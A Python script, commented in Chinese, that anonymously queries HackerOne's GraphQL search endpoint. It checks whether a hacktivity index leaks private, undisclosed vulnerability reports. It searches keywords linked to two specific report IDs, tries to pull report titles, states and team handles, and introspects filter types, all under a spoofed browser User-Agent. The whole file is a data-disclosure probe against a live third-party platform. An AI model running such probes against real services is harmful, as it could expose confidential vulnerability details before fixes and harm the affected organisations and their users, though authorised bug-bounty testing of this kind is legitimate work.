# -*- coding: utf-8 -*-
"""T1f:私有报告搜索探测(2026-09-08,匿名)——CompleteHacktivityReportIndex 是否含私有"""
import requests
import json
import time

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
S = requests.Session()
S.headers.update({"User-Agent": UA})
IDX = "CompleteHacktivityReportIndex"

def gql(query, label, ms=20000):
    try:
        r = S.post("https://hackerone.com/graphql", json={"query": query}, timeout=ms)
        print(f"== {label}: {r.status_code} {r.text[:2200]}")
    except Exception as e:
        print(f"== {label} ERR {e}")

# 1. 特征词搜索(私有报告探测:pg_repack = 3992341/3732660 的漏洞组件)
for i, q in enumerate(["pg_repack", "SECURITY DEFINER", "repack.log", "Tenant to cloud_admin", "cloud_admin superuser"]):
    gql('{ search(index: %s, query_string: %s, first: 3){ total_count edges{ node{ id public disclosed } } } }' % (IDX, json.dumps(q)), "kw_%d" % i)
    time.sleep(0.5)

# 2. 返回文档读字段(用上一个成功词)
gql('{ search(index: %s, query_string: "pg_repack", first: 3){ total_count edges{ node{ id public disclosed report{ id title substate } team{ handle } } } } }' % IDX, "doc_fields")
time.sleep(0.3)

# 3. FilterInput/MustInput 结构
gql("""{ a:__type(name:"FilterInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
b:__type(name:"MustInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } } }""", "filters")
